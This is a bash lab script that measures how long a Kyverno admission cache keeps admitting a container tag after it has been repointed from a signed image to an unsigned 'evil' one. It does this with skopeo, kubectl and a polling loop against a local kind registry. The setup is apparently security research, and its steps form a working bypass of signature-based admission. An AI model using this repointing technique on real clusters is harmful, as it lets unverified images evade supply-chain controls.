#!/usr/bin/env bash
# Reproduces the stale-verification window: admit :v1 (signed), repoint :v1 to
# an unsigned image, admit :v1 again. MODE = default | ttl2m | off.
set -uo pipefail
source "$(dirname "$0")/lib.sh"
MODE=${1:-default}
OUT="$LAB/results/repoint-cache/$MODE"; mkdir -p "$OUT"
R=kind-registry:5000/demo/app
SK=(--all --preserve-digests --src-tls-verify=false --dest-tls-verify=false)
GOOD=$(cut -d@ -f2 "$LAB/results/sign/signed-ref.txt")
kyverno_mode "$MODE"
kubectl -n kyverno get deploy kyverno-admission-controller \
  -o jsonpath='{.spec.template.spec.containers[0].args}' | tr ',' '\n' | grep -i cache > "$OUT/args.txt"

admit() {  # admit NAME -> "DECISION<TAB>pinned-image"
  local o; o=$(kubectl -n prod run "$1" --image="$R:v1" --restart=Never \
    --env=APP_SECRET=lab-secret-value -o jsonpath='{.spec.containers[0].image}' 2>&1) \
    && printf 'ALLOWED\t%s\n' "$o" || printf 'DENIED\t%s\n' "$(echo "$o" | tr '\n' ' ' | cut -c1-160)"
}
: > "$OUT/timeline.tsv"
kubectl -n prod delete pod --all --wait=true >/dev/null 2>&1
skopeo copy -q "${SK[@]}" "docker://$R@$GOOD" "docker://$R:v1"
printf 't=0s\twarm\t%s\n' "$(admit warm)" | tee -a "$OUT/timeline.tsv"
skopeo copy -q "${SK[@]}" "docker://$R:evil" "docker://$R:v1"
T0=$(date +%s)
printf 't=0s\trepointed-to\t%s\n' "$(skopeo inspect --tls-verify=false docker://$R:v1 | jq -r .Digest)" | tee -a "$OUT/timeline.tsv"
printf 't=%ss\tafter-repoint\t%s\n' "$(( $(date +%s)-T0 ))" "$(admit evil-0)" | tee -a "$OUT/timeline.tsv"

if kubectl -n prod wait --for=condition=Ready pod/evil-0 --timeout=60s >/dev/null 2>&1; then
  IP=$(kubectl -n prod get pod evil-0 -o jsonpath='{.status.podIP}')
  kubectl run -n default probe-$MODE --rm -i --restart=Never --image=busybox:1.37.0 -- \
    wget -qO- -T5 "http://$IP:8080/whoami" > "$OUT/evil-whoami.txt" 2>&1
  kubectl -n prod get pod evil-0 -o jsonpath='{.status.containerStatuses[0].imageID}{"\n"}' >> "$OUT/evil-whoami.txt"
fi
# Poll until the stale entry stops admitting (step and limit in seconds).
STEP=${STEP:-20}; LIMIT=${LIMIT:-300}; i=1
while [ $(( $(date +%s)-T0 )) -lt "$LIMIT" ]; do
  sleep "$STEP"
  line=$(admit "evil-$i"); kubectl -n prod delete pod "evil-$i" --wait=false >/dev/null 2>&1
  printf 't=%ss\tpoll\t%s\n' "$(( $(date +%s)-T0 ))" "$line" | tee -a "$OUT/timeline.tsv"
  case $line in DENIED*) break ;; esac; i=$((i+1))
done
skopeo copy -q "${SK[@]}" "docker://$R@$GOOD" "docker://$R:v1"
kubectl -n prod delete pod --all --wait=false >/dev/null 2>&1
